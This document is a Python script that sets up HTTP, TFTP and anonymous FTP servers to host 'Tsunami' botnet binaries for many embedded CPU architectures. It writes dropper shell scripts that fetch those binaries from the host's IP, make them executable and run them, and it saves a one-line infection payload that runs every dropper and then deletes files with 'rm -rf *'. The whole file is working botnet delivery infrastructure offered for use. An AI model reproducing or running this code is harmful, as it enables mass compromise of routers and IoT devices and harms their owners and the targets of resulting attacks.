import subprocess, sys, urllib, time

ip = urllib.urlopen('http://api.ipify.org').read()

dropper = "Tsunami"
bindir = "OwO"

archs = ["x86",
"mips",                       
"mpsl",                      
"arm",                     
"arm5",                      
"arm6",                       
"arm7",                       
"ppc",                    
"spc",                       
"m68k",                     
"sh4"]
                  
def run(cmd):
    subprocess.call(cmd, shell=True)
	
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
run('echo "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
run('echo "#!/bin/bash" > /var/www/html/wget.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
run('echo "#!/bin/bash" > /var/ftp/ftp.sh')
run('echo "ulimit -n 1024" >> /var/ftp/ftp.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/ftp.sh')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bindir+'/Tsunami.'+i+'; curl -O http://' + ip + '/'+bindir+'/Tsunami.'+i+';cat Tsunami.'+i+' >'+dropper+';chmod +x *;./'+dropper+' '+i+'" >> /var/www/html/wget.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' Tsunami.'+i+' Tsunami.'+i+';cat Tsunami.'+i+' >'+dropper+';chmod +x *;./'+dropper+' '+i+'" >> /var/ftp/ftp.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get Tsunami.'+i+';cat Tsunami.'+i+' >'+dropper+';chmod +x *;./'+dropper+' '+i+'" >> /var/lib/tftpboot/tftp1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Tsunami.'+i+' -g ' + ip + ';cat Tsunami.'+i+' >'+dropper+';chmod +x *;./'+dropper+' '+i+'" >> /var/lib/tftpboot/tftp2.sh')    

run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run("echo -e \"ulimit -n 99999\" >> ~/.bashrc")

complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/wget.sh; curl -O http://" + ip + "/wget.sh; chmod 777 wget.sh; sh wget.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp.sh ftp.sh; sh ftp.sh; rm -rf wget.sh tftp1.sh tftp2.sh ftp.sh; rm -rf *")

file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()